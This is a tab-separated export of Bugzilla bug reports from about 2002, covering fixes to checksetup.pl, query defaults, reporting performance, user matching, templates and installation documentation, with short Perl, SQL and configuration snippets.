172383%TAB%1033630629%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%checksetup.pl run through a dictionary and a timeless parsing,checksetup.pl : spelling, wording, and whitespace fixes%TAB%checksetup.pl run through a dictionary and a timeless parsing,checksetup.pl : spelling, wording, and whitespace fixesAlmost everything is spelling, I'll attach the spelling tool I used since it will come in handy later.  It's not perfect, but basically you use it like this:  wordsplitter inputfile > outputfile spellcheck outputfile  in the spellchecker you stare at the misspelled word field and hover over the ignore button. you click ignore a *lot* of times until you've reached the end of the document. Every now and then your brain says "hey that's not supposed to be there", when you realize you reached one of those points you should stop clicking.  go back to the word, you'll see something that looks like this:  multiplicable (1454:1)  That tells you that on line 1454 of your input file the 1th thing that it found that resembled a word failed the dictionary lookup.  J:\2002\bugz\mozilla\webtools\bugzilla>grep -n+ multiplicable *.pl File checksetup.pl: 1454        is_multiplicable    TINYINT       NOT NULL  DEFAULT 0 ,  Open the inputfile and goto the line and work on a correction. The error listed above is not corrected because it has structural meaning, so someone else will have to fix it.  Suggested sequence: read the file once, fix all the grammar and similar issues first. Then run the wordsplitter and then fix the spelling errors (this way you can catch your own too).
172415%TAB%1033638085%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Bugzilla should support bug IDs with a leading #.,Bugzilla should support URLs containing bug IDs with a leading #.%TAB%Bugzilla should support bug IDs with a leading #.,Bugzilla should support URLs containing bug IDs with a leading #.You know the situation. You get a mail with a comment, where the person writing the comment has used the form "bug #12345" (MattyT is particularly keen on this), or it's a review mail which uses this form. You want to go to the bug.  You copy the text and paste it into your URL bar or middle-click in a Mozilla tab, for your custom "bug" keyword to chew on the text. Disaster! It goes to: http://bugzilla.mozilla.org/show_bug.cgi?id=#12345 and Bugzilla complains that it's not a valid bug number.  Bugzilla shouldn't complain, but DTRT.
172434%TAB%1033642804%TAB%66787%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User,Miscellaneous,Creating/Changing Bugs%TAB%Useful link on the bugzilla page to ease download of NEWEST version%TAB%Useful link on the bugzilla page to ease download of NEWEST version "This form prompts you for the information required to file a good bug report (or enhancement request.) It may seem lengthy, but Mozilla developers need all this information to understand and reproduce the bug, which is the first step towards fixing it. Please note that we do not accept bug reports by email - please do not email developers or mozilla.org staff with bug reports. Also, please do not file bugs on copies of Mozilla older than two weeks."  I propose to add at the end of this paragraph a direct link to the download page of the newest version(s) fullfilling this requested property. Normal users normally don't know:  - what the newest version is  - where to download and not crazy people also avoid search half an hour or an hour to may be find something to download which may be that what you mentioned here.
172518%TAB%1033666398%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Attachments & Requests%TAB%make request tracker use generic user matching code%TAB%make request tracker use generic user matching codeThe user matching code in bug 162990 doesn't work with the request tracker, which has its own code for doing the same thing.  The request tracker should use the code in bug 162990, however.
172740%TAB%1033771340%TAB%29274%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%"use of uninitialized variable" warnings%TAB%"use of uninitialized variable" warningsTry doing a search:  buglist.cgi: Use of uninitialized value in string eq at /var/www/html/bugzilla-misc/buglist.cgi line 86.  You need to test $::FORM{'format'} before doing the string compare  buglist.cgi: Use of uninitialized value in substitution (s///) at globals.pl line 1643. buglist.cgi: Use of uninitialized value in pattern match (m//) at Bugzilla/Util.pm line 114.  These are because GetFormat has:      $ctype ||= "html";          # Security - allow letters and a hyphen only     $ctype =~ s/[^a-zA-Z\-]//g;     $format =~ s/[^a-zA-Z\-]//g;     trick_taint($ctype);     trick_taint($format);      but doesn't check to see if $format was undef first. You need  $format ||= "";
172874%TAB%1033874246%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Attachments & Requests%TAB%cvs remove attachstatus templates%TAB%cvs remove attachstatus templateseditattachstatuses.cgi has gone, but the templates in template/en/default/attachment remain.
172875%TAB%1033874356%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Attachments & Requests%TAB%Fix site-navigation.html.tmpl to link to flags CGI and not attachments one%TAB%Fix site-navigation.html.tmpl to link to flags CGI and not attachments oneWhen we checked in site-navigation.html.tmpl recently, we didn't notice it still linked to editattachstatuses.cgi.
172959%TAB%1033909216%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%Remove old reporting (most doomed etc.)%TAB%Remove old reporting (most doomed etc.)Remove old reporting (most doomed etc.)
173005%TAB%1033942108%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Reporting/Charting%TAB%Add bar charts, pie charts etc. to reporting%TAB%Add bar charts, pie charts etc. to reportingWe should use the Template Toolkit interface to GD to allow the generation of bar charts, pie charts etc. instead of tables for the reports.
173027%TAB%1033957340%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%code-error.html.tmpl misses a </em>%TAB%code-error.html.tmpl misses a </em>-    The component <em>[% variables.component FILTER html %] does not exist +    The component <em>[% variables.component FILTER html %]</em> does not exist  Additional I'd like to ask whether all errors should have an uniq title (as they do in user-error.html.tmpl) or not ("Internal Error" in code-error.html.tmpl). In code-error.html.tmpl only 6/33 errors have a title.
173249%TAB%1034047651%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%user-error.html.tmpl: Bogus title, inconsistent indenting%TAB%user-error.html.tmpl: Bogus title, inconsistent indenting[% ELSIF error == "email_confirmation_failed" %] -    [% title = "Email Address Email Address Confirmation Failed" %] +    [% title = "Email Address Confirmation Failed" %]  Plus some indent only changes (2 versus 3 spaces, space indent after [% title %]
173341%TAB%1034080492%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%Move assigned_to change field into main body of bug form%TAB%Move assigned_to change field into main body of bug formThe assigned_to field is currently changed down in the knob. This is inconsistent, and gives rise to a class of bugs like "I want to reassign the bug and also do X". We should move it up into the body of the bug, and make it independently editable.
173484%TAB%1034138345%TAB%33998%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%dbschema.jpg file is out of date%TAB%dbschema.jpg file is out of dateThe dbschema.jpg file doesn't show the real tables in the database. It looks to me that it wasn't updated for a long time - the last modified date  is 29-08-2001
173495%TAB%1034142351%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%require perl 5.6%TAB%require perl 5.6As discussed on developers@bugzilla.org, perl5.005 is old, and has taintness interactions with TT. Most of the bugzilla developers use a newer version of perl, which means that it doesn't get testing - witness bug 160710, which went 5.5 months between the cause being commited, and the bug eventually being noticed after 2.16 was released  Since we want to be able to [% PROCESS "foo-$format.html.tmpl" %] as we move bugzilla to be more generic, we need to resolve this.  It may be possible to work out where TT is triggering this bug, and then change TT. However, that doesn't guarantee that there aren't other 5.005 issues lurking which noone is detecting.  I'll post to the newsgroup after I submit this (so that I have a bug #), but if I don't get anyone with a very good reason to avoid this, I'll do this next week.  Note that, regardless of this bug, we will be requiring 5.005_03 RSN, and newer DBI versions require that. Anyone wanting an earlier version than that will be ignored :)
173567%TAB%1034164677%TAB%9911%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Query/Bug List%TAB%Default to exact match for email search in queries,Default to "exact match" for email search in queries%TAB%Default to exact match for email search in queries,Default to "exact match" for email search in queriesSubstring email searches take far longer than exact match ones, and exact match is often what people want. Also, if they put in a partial match and click Search, they'll just get Zarro Boogs and can come back and adjust the setting, whereas the other way round we do the expensive query regardless.
173571%TAB%1034164750%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Query/Bug List%TAB%Turn "all selected" into "none selected" for efficiency%TAB%Turn "all selected" into "none selected" for efficiencySelecting all the entries in an listbox on the query page is equivalent to selecting none of them, but about twice as slow. buglist.cgi should spot when all entries have been selected, and turn it into the "none" case.
173581%TAB%1034165679%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration%TAB%Changing milestone sortkeys is broken%TAB%Changing milestone sortkeys is brokenUPDATE milestones SET sortkey=3 WHERE product='WorldControl' AND value='M1': Unknown column 'product' in 'where clause' at globals.pl line 246.  Presumably this is fallout from the introduction of product IDs. 
173622%TAB%1034176825%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Move template handling code into a module%TAB%Move template handling code into a moduleWe should move the template/vars stuff into a module. This is because:  - we shouldn't be running the code from a require'd file - global variables suck - its cleaner/nicer/more efficient
173629%TAB%1034178061%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Clean up scripts for mod_perl,Clean up "my" variable scoping issues for mod_perl%TAB%Clean up scripts for mod_perl,Clean up "my" variable scoping issues for mod_perlFor the record, I'm pretty sure that the code should instead be:  our $foo = 0;  sub bar {   $foo = $foo + 42;   print $foo; }  Note that the "= 0" part is important.
173689%TAB%1034211925%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Query/Bug List%TAB%Default text search boxes to "contains string",Default comments search box type to "contains string"%TAB%Default text search boxes to "contains string",Default comments search box type to "contains string"Currently, the comment search, URL search and whiteboard search default to "contains all of the words/strings". This leads to queries like this:    3832327   bugs   localhost   shadow_bugs   Query     205    Copying to tmp table   SELECT DISTINCT bugs.bug_id, bugs.groupset, bugs.bug_severity, bugs.priority, bugs.rep_platform, map_assigned_to.login_name, bugs.bug_status, bugs.resolution, bugs.short_desc FROM bugs, profiles map_assigned_to, profiles map_reporter LEFT JOIN profiles map_qa_contact ON bugs.qa_contact = map_qa_contact.userid, longdescs longdescs_ WHERE ((bugs.groupset & 0) = bugs.groupset ) AND bugs.assigned_to = map_assigned_to.userid AND bugs.reporter = map_reporter.userid AND longdescs_.bug_id = bugs.bug_id AND (bugs.product = 'Browser') AND (INSTR(LOWER(longdescs_.thetext), '"cannot') AND INSTR(LOWER(longdescs_.thetext), 'be') AND INSTR(LOWER(longdescs_.thetext), 'found"') AND INSTR(LOWER(longdescs_.thetext), 'dialog')) ORDER BY bugs.bug_id     He meant to search for bugs with the string "cannot be found dialog", but ended up doing the very expensive search for bugs with "cannot", "be", "found" and "dialog" all in the same comment, anywhere. I can see why he might have thought that he had selected the correct option - "contains all of the words/strings" could be assumed to mean "contains this entire string", if you weren't familiar with the language.  This suggestion continues the trend of setting default values to less expensive searches, so if people do the wrong thing, it doesn't cost too much of Bugzilla's resources.  I think this change would be a reasonable default, rather than a b.m.o.-specific customisation.
173719%TAB%1034223213%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%warnings in report.cgi%TAB%warnings in report.cgireport.cgi is spewing warnings. Incomplete sampling:  - arround line 97/98, $columns{''} may be undefined, so you get undefined warnings - The + in the template seems to be causing warnings, again with uninitilised values, 
173721%TAB%1034223487%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%report.cgi needs to re-catch $SIG{TERM}%TAB%report.cgi needs to re-catch $SIG{TERM}Similarly to buglist.cgi, we do want reports to be interruptable.  You need to:  # XXX - mod_perl $::SIG{TERM} = 'DEFAULT'; $::SIG{PIPE} = 'DEFAULT';  at the top of the script. (Include the comment so that we remember to go through this later.)
173761%TAB%1034237005%TAB%63016%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Accounts%TAB%Need ability to always require login%TAB%Need ability to always require loginFor open-source projects, it's a plus that bugzilla allows anyone to query bugs, etc. without logging in.  But for other projects this isn't always desirable.  What we'd like to do is make our bugzilla visible on the internet, but only allow people with valid accounts to access it.  (We've also disabled the 'create new account' page.)  In other words, any time any bugzilla page is requested but a valid login cookie is not present, the "I need a valid email address and password to continue" page should be displayed.
173808%TAB%1034251652%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%Use of uninitialized value in subtraction (-) at duplicates.cgi line 133%TAB%Use of uninitialized value in subtraction (-) at duplicates.cgi line 13328707  duplicates.cgi: Use of uninitialized value in subtraction (-) at /opt/webtools/bugzilla/duplicates.cgi line 133.  This is the second most common log error on b.m.o, and a one-line fix.
174085%TAB%1034373381%TAB%32335%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Query/Bug List%TAB%Want to be able to query via groupset in quicksearch,Want to be able to query via group in quicksearch%TAB%Want to be able to query via groupset in quicksearch,Want to be able to query via group in quicksearchWant to be able to query via groupset in quicksearch,  Want to be able to query via group in quicksearch
174103%TAB%1034399511%TAB%12816%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%Query page - 'Search' is a wrong name for button at bottom%TAB%Query page - 'Search' is a wrong name for button at bottomBefore any critics i would like to thank for your job, bugzilla is great (really!).  There is a small problem about wich i always think, when i have to show bugzilla to other people:  If You now check query page you will see something like this: ----------------------------------------- Summarry (contains...^) [_________________] [Search]  then come all the fields (a lot of them, you will agree :)  and then:  (.) Run this query ( ) Load my remembered query:    ( ) Run my remembered query: ( ) Forget my remembered query:  ( ) Remember this as my default query ( ) Remember this query, and name it:       [x] and put it in my page footer  Sort results by: [          ^]  [Search] -----------------------------------------  On the top the search button is intuitive and does what it says, but i think that something has to be done with [Search] at bottom: the problem is, that in fact "Search" will be performed only, if you tick "run this query". In other cases it will load, forget, remember, run remembered, aso.  Also "run this query" is not quite "search" (because then the logic sentence is "search run this query" ) - it's more like "do" or "ok"  I suggest to rename this button to 'Ok' or 'Do it!' or 'I will feel buggy tomorrow' (um, ignore the last one). And also - to split the form submit logic into "Search" and "Do the other things" (now, if i check everything at bottom, press the search button on top, it will do the same what at bottom)  p.s. also - right now i checked bugzilla tip (http://landfill.tequilarista.org/bugzilla-tip/query.cgi) , and if it will look like what it looks now, then i suggest to remove(hide) the radio "run this search" and leave the text, because there is no sence for radio button with only one option (unless it's dynamic)
174112%TAB%1034404019%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Documentation,Creating/Changing Bugs%TAB%Edit multiple bugs broken%TAB%Edit multiple bugs brokenEdit multiple bugs broken
174221%TAB%1034487176%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%field names should be l10n in user-errors.html.tmpl called by Add Estimated, Actual, Remaining Time Fields%TAB%field names should be l10n in user-errors.html.tmpl called by Add Estimated, Actual, Remaining Time Fields+  [% ELSIF error == "need_positive_number" %] +    [% title = "Positive Number Required" %] +    [% field %] requires a positive number.  +  [% ELSIF error == "value_out_of_range" %] +    [% title = "Value Out Of Range" %] +    Value is out of range for field [% variable %].  where the "variable" and the "field" is a hard coded string. This makes the translation of this string rather hard. How about using field-descs.html.tmpl for this purpose? Additionallay a "The <em>estimated Time</em> requires a positive number." is more verbose than a "estimated_time requires a positive number." even in English ;-)
174255%TAB%1034506442%TAB%70908%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%Typo & omission in Install Guide's Apache directives%TAB%Typo & omission in Install Guide's Apache directives(Couldn't find this already reported and it was still incorrect in HEAD, so I'll report it here. Please tread lightly if this is a dup. :-)  The Bugzilla installation instructions (mozilla/webtools/bugzilla/docs/sgml/installation.sgml) have a couple typos/omissions in the Apache configuration directives they mention.  529 <programlisting>Options ExecCGI AllowOverride Limit</programlisting>  This should be two directives:  Options ExecCGI AllowOverride Limit  and perhaps even:  Options +ExecCGI AllowOverride Limit  to preserve any existing Options.   Additionally, Apache may also need a:  DirectoryIndex index.cgi  in order to display the main Bugzilla page as the directory index. I couldn't find this explicitly mentioned in the docs.
174295%TAB%1034534081%TAB%5898%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%GROUP BY needs to be more SQL Standard compliant,ANSI SQL requires all columns in SELECT to be in GROUP BY, unless they are in "aggregate" functions%TAB%GROUP BY needs to be more SQL Standard compliant,ANSI SQL requires all columns in SELECT to be in GROUP BY, unless they are in "aggregate" functionsSQL standard requires that any column referenced in the HAVING clause be in the GROUP BY clause or be the argument of some aggregate function.  This is done to make sure it is a scalar expression. 
174464%TAB%1034609120%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%buglist code for empty query shouldn't set headers_done%TAB%buglist code for empty query shouldn't set headers_doneIf length($::buffer) is 0, then we print out the content type, set $vars->{header_done}, and throw an error.  The problem with this is that header_done also controls the actual bugzilla banner, so its not displayed. The fix is to just remove the contenttype/header_done stuff, and rely on teh error handling code to deal with it
174524%TAB%1034644004%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Tidy up Bugzilla::{Util,Config}, and lazy-load uneeded modules,Tidy up Bugzilla::{Util,Config}, and lazily-load unneeded modules%TAB%Tidy up Bugzilla::{Util,Config}, and lazy-load uneeded modules,Tidy up Bugzilla::{Util,Config}, and lazily-load unneeded modulesa) Move the POD to under an __END__ line. This allows the perl parser to avoid having to skip over all the POD, since it stops as soon as it gets to the __END__ line. The perf improvment of this was not measurable on my unloaded PIII-500.  b) load Data::Dumper and File::Temp only when required. This speeds up loading Bugzilla::Config quite a bit, especially when combined with http://www.template-toolkit.org/pipermail/templates/2002-October/003790.html, which does the same thing to TT. (myk, you may want to apply that locally to bmo when you upgrade TT).
174731%TAB%1034734232%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Attachments & Requests%TAB%Spurious flags are set by default%TAB%Spurious flags are set by defaultWhen a bug flag is defined, then used on some bugs, and then a new flag is defined -- The bugs that previously had only the first flag magically have the new flag used (as opposed to just available).  Possibly related, when several bug flags are available to be used and then one is used, the others seem to be used even if not selected.  Both of these issues apply to the "multiple" flags.
174922%TAB%1034807248%TAB%71359%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%Bugzilla documentation is too vague about "bonsaitools"%TAB%Bugzilla documentation is too vague about "bonsaitools"The current Bugzilla documentation at http://www.bugzilla.org/docs/html/ says the following in section "4.1.7 Bugzilla":  "Lastly, you'll need to set up a symbolic link to /usr/bonsaitools/bin/perl for  the correct location of your Perl executable (probably /usr/bin/perl)."  It is safe to say that not everyone is familiar with "bonsaitools" at the time of Bugzilla installation/configuration. What is bonsaitools? Is it required for Bugzilla? If so, how does it install/work? What if I don´t have it? etc.
174992%TAB%1034832164%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%Enhance intermediate verify screen on product change%TAB%Enhance intermediate verify screen on product changeWith enhanced product groups, the number of potential options for group changes explodes.  The initial implementation of bug 147275 maintains the existing functionality of product groups and handles transitions in and out of mandatory and n/a groups transparently.  Sites that use the new product groups to configure a huge amount of flexibility in product transitions will want additional notices and options on the intermediate page.
175222%TAB%1034898768%TAB%71580%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Email Notifications%TAB%Add product and component fields to change mails%TAB%Add product and component fields to change mailsIt would be nice to have a %product% and %component% (or any other field if you are at it) to insert into the newchangedmail parameter.
175625%TAB%1035097837%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Timetracking columns are computed even if not displayed%TAB%Timetracking columns are computed even if not displayedThe columns are removed only if not a member of the timetracking group. I agree that they should only be added if the time stuff is selected in colchange.cgi. Also there is a bug in the time code in buglist.cgi.  # remaining and actual_time are required for precentage_complete calculation: if (lsearch(\@displaycolumns, "percentage_complete")) {     push (@selectcolumns, "remaining_time");     push (@selectcolumns, "actual_time"); }  should be  # remaining and actual_time are required for precentage_complete calculation: if (lsearch(\@displaycolumns, "percentage_complete") >= 0) {     push (@selectcolumns, "remaining_time");     push (@selectcolumns, "actual_time"); }
175838%TAB%1035197124%TAB%27170%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Reopening a bug does not clear resolution, nor does selecting 'clear resolution'%TAB%Reopening a bug does not clear resolution, nor does selecting 'clear resolution'Reopening a bug results in a REOPENED FIXED status/resolution.  Using the knob "clear resolution" fails to work.
175903%TAB%1035214442%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%Links from tabular report totals to queries don't work properly%TAB%Links from tabular report totals to queries don't work properlyIn tabular reports, it is generally possible to click on a number and see the bugs that were counted toward the number.  This is not reliable in the 3D reports for the Total table.
176002%TAB%1035266069%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Reporting/Charting%TAB%Move duplicates into the db,Move duplicate statistics into the db%TAB%Move duplicates into the db,Move duplicate statistics into the dbMove duplicates into the db,  Move duplicate statistics into the db
176011%TAB%1035268277%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%reports.cgi throws a scary error if collectstats has never been run%TAB%reports.cgi throws a scary error if collectstats has never been runOn an installation where collectstats has never been run, the graphical reports links (including the one on index.cgi) are still offerred.  If a user clicks on those links, they get a big scary error banner....  Unable to open the chart datafile data/mining/-All-.   Variables:     filename: data/mining/-All-      Either the links should be suppressed or a better error message needs to explain that there is no data to chart.
176461%TAB%1035426260%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%Move descs strings from change-columns.html.tmpl to field-descs.html.tmpl%TAB%Move descs strings from change-columns.html.tmpl to field-descs.html.tmplI left in change-columns.html.tmpl: [% field_descs = { "summary" => "Summary (first 60 characters)", 		   "summaryfull" => "Full Summary" } %]
176509%TAB%1035445562%TAB%26341%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%"This bug is not in your list" appears in error.%TAB%"This bug is not in your list" appears in error.The trick here is that the navbar shown UNDER the "bug has been processed" is for the next bug in your list, not the current bug.  The problem is that bug is the last bug in the list, and thus there is no next bug.
176599%TAB%1035468631%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Reporting/Charting%TAB%Improve performance of duplicates.cgi%TAB%Improve performance of duplicates.cgiMoving the stats into the DB is desireable, but an effort. I think we should immediately make the following changes: - Incorporate the "openonly" functionality into the query. - Incorporate the access check into the query - Incorporate the "numwanted" functionality into the query. Because the access check is also incorporated, we won't need to iterate.  This should make a significant difference. Then, we can work out what schema we need to move the stats into the DB. 
176936%TAB%1035644784%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Administration%TAB%minor consistency changes for editproducts and editflags%TAB%minor consistency changes for editproducts and editflags-- yes, i'm actually starting to use bugzilla's admin features on a (large, well known, public) production installation --  Everywhere except editflags lets you click the thing's name to /edit/ it. "Add" is smaller in editproducts than everywhere else.  Yes, flags is evil and uses create instead of add, that's too complicated for me to change since i can't see in bmo.
176953%TAB%1035657536%TAB%5898%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%version not set properly from form value like others%TAB%version not set properly from form value like othersWhen submitting information to enter_bug.cgi from another form, version is not set properly. Other values such as product, component, etc. are set properly. Adding condition looking for formvalue('version') if exists fixes. Patch coming.
177099%TAB%1035778419%TAB%12816%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Stored queries ordering and editing broken after moving to CGI.pm%TAB%Stored queries ordering and editing broken after moving to CGI.pmAs already discussed in irc.mozilla.org: After moving to CGI.pm, stored queries are something like broken.  Bugzilla Version 2.17 Steps to reproduce(1): 1.1. Click on a stored query 1.2. Click on one of column names to change order  Result - you get buglist of all bugs Expected - stored query ordered by field  Steps to reproduce(2): 2.1. Click on a stored query 2.2. Click on "Edit this query" Result - you get default query to edit. Expected - stored query to edit
177224%TAB%1035830082%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%note XUL and RDF MIME types%TAB%note XUL and RDF MIME typesWe should note the XUL and RDF MIME types in the documentation and recommend installations configure their web server to serve those kinds of files (f.e. duplicates.xul, data/duplicates.rdf) with the appropriate type.
177351%TAB%1035890457%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Installation & Upgrading%TAB%checksetup.pl tells about deleting templates in silent-running mode%TAB%checksetup.pl tells about deleting templates in silent-running modeThe checkin from bug 168191 has caused me to start receiving email from landfill.bugzilla.org/bugzilla-tip on an hourly basis informing me that the compiled templates are being deleted.  Output from checksetup.pl which happens every time you run it no matter what is supposed to have "unless $silent" after it so it doesn't output in silent-running mode (i.e. via a cron job).  The only output from checksetup.pl in silent-running mode is supposed to be things the admin needs to know about (i.e. changes to database structure, or something that requires input from the admin before it can continue).
177430%TAB%1035932072%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Query/Bug List%TAB%Query page needs UI to select CSV output format,buglist.cgi needs a CSV output format%TAB%Query page needs UI to select CSV output format,buglist.cgi needs a CSV output formatbuglist.cgi can already do CSV output by adding &format=csv to the URL.  There needs to be a UI on the query page for selecting this.
177435%TAB%1035935578%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%exact match on assignee fails with user matching%TAB%exact match on assignee fails with user matchingee the attached URL on bugzilla-tip on landfill.  Make any change to that bug and commit.  You'll get the following error:  Assignee:   cyeh@bluemartini.com  did not match anything  a) I didn't change the assignee. b) it better match because it was prefilled on the form already when I loaded it.
177436%TAB%1035936551%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%User matching shouldn't be case-sensitive%TAB%User matching shouldn't be case-sensitiveOn bugzilla-tip on landfill (with usermatchtype in params set to "search" rather than "wildcard"), I entered "miller" in the CC field on a bug and hit Commit.  I was prompted with several choices, none of which were me.  The ones I got all had "miller" as part of their email address as well.  I went back and changed it to "Miller" and this time it found me.
177449%TAB%1035945297%TAB%10914%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Accounts%TAB%When changing email address, old email address confirmation in case sensitive,When changing email address, old email address confirmation is case sensitive%TAB%When changing email address, old email address confirmation in case sensitive,When changing email address, old email address confirmation is case sensitiveI recently changed my email address that bugzilla has.  It was a fairly nice process except that I was asked to enter my old email address as confirmation as the last step.  That email address seems to be case sensitive (although email addresses in general are not)  Bugzilla had me down with a capital O in my email address and I tried to confirm without.  After I copied and pasted the address I figured out what happened, but it was confusing.
177624%TAB%1036007296%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%Wildcard rejects --do_not_change-- in mass-change%TAB%Wildcard rejects --do_not_change-- in mass-changeWhen a form indicates --do_not_change-- as, for example, QA contact, the wildcard feature complains that the string did not match anything.  This is true even in wildcard mode where there shoudl be no reason for wildcard to look anything up unless there is a "*" in it.
177828%TAB%1036081388%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Taint warning from post_bug with perl 5.8%TAB%Taint warning from post_bug with perl 5.8As reported on npm.webtools, when submitting a new bug using perl 5.8, we get a taint warning because the multi-arg form for exec considers having tainted arguments as deprecated.  We already check the values in the cc field + so on for validity, as does processmail, so I don't think its a security issue.   It is something which we should fix, though. For the old system, that would havebeen a trick_taint in the loop. Not sure if we can use a similar solution with match_email, but we probably can.
177850%TAB%1036093109%TAB%20977%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%checksetup fails when bugzilla is in directory containing /data/,checksetup fails if the user does not have read permission to the whole bugzilla path%TAB%checksetup fails when bugzilla is in directory containing /data/,checksetup fails if the user does not have read permission to the whole bugzilla pathWhen I was installing bugzilla to a site where the path to bugzilla was:  /data/www/customers/xyz/public_html/bugzilla  After finddepth had reported the error, cwd was /data/www/customers  I added a chdir("/data/www/customers/xyz/public_html/bugzilla") after the finddepth and changed COMPILE_DIR to point to full path. After these changes I managed to get checksetup through.  Error message from unmodified checksetup:  Removing existing compiled templates ... [Fri Nov  1 05:48:28 2002] checksetup.pl: Can't stat data/template: No such file or directory Content-type: text/html  <H1>Software error:</H1> <PRE>mkdir data: Permission denied at /data/www/customers/xyz/local/share/perl/5.6.1/Template/Provider.pm line 368 </PRE> <P> For help, please send mail to this site's webmaster, giving this error message and the time and date of the error.  [Fri Nov  1 05:48:28 2002] checksetup.pl: mkdir data: Permission denied at /data/www/customers/xyz/local/share/perl/5.6.1/Template/Provider.pm line 368
177993%TAB%1036168047%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%Should point out that the Mid-air Collision message is customizable%TAB%Should point out that the Mid-air Collision message is customizableAn email I received today (edited for anonymity)  --------- I thought you might find this quite humorous... so I shall share.  At ... (online travel site owned by ... Airlines), we use bugzilla for defect tracking.  One day, an external Airline client with access to our bugzilla encountered a simultaneous change while trying to commit changes to their bug.  The response returned from bugzilla was 'Mid-air collision detected'.  As you can imagine, when a nationally recognized Airline receives an error message like that, they aren't very amused.   The message was immediately changed to be more "sensitive" ;) ----------  I received a "less friendly" message from another travel site with this same situation a month or two ago (this email reminded me of it) and the previous one didn't know how to change that message.  So we should make sure it's mentioned in the guide, just in case.
178019%TAB%1036184919%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Reporting/Charting%TAB%reports.cgi should use the shadowdb%TAB%reports.cgi should use the shadowdbLong running queries mean that reports.cgi needs to use the shadowdb  You have added fun because of the config_login stuff; you'll need to login using the main db, then switch to the shadowdb.
